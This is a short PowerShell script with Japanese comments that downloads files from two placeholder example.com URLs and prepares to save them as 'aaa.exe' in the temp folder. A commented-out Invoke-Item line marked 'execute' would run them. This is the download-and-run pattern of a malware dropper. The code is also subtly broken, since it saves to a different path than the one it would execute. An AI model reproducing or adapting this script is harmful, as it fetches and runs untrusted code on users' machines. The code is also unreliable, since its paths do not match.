$client = New-Object Net.WebClient;

$urls = "http://example.com/1
@http://example.com/2".Split("@");

$name = "aaa";
$path = $env:TEMP+'\'+$name+'.exe';

foreach($url in $urls) {
    try{
        # ファイルを落としてくる(https未対応)
        $client.DownloadFile($url, $name);
        
        # 実行
        #Invoke-Item $path
    }catch{
        #echo $Error
        echo error
    }
}
